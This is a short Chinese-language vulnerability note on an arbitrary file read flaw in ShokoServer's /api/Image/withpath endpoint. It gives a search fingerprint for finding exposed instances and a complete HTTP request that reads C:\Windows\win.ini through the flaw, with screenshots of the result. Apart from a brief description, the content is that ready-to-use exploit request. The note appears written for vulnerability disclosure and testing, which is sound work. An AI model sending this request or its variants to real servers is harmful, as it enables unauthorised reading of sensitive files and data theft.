# ShokoServer withpath存在任意文件读取漏洞

# 一、漏洞简介
 Shoko Server 是一个基于 Java 的开源媒体服务器软件，旨在提供一个统一的媒体管理和流媒体解决方案。它支持多种媒体格式，包括视频、音频、图片等，能够对媒体文件进行索引、搜索、播放和流媒体等操作，ShokoServer 接口处存在任意文件读取漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件，例如客户记录、财务数据或源代码，导致数据泄露。 

# 二、影响版本
ShokoServer 

# 三、资产测绘
```plain
title="Shoko WEB UI"
```

![1718818450198-44a101d0-316c-4d7e-8400-2a31b8d1f59e.png](./img/wxwNT0908SqtJqKO/1718818450198-44a101d0-316c-4d7e-8400-2a31b8d1f59e-667302.png)

# 四、漏洞复现
```java
GET /api/Image/withpath/C:\Windows\win.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```

![1718818490807-dfbfe785-9fb9-4d6b-82ef-ba88038a9dcb.png](./img/wxwNT0908SqtJqKO/1718818490807-dfbfe785-9fb9-4d6b-82ef-ba88038a9dcb-188673.png)





> 更新: 2024-06-23 23:42:48  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xf0qp3zhll25buy9>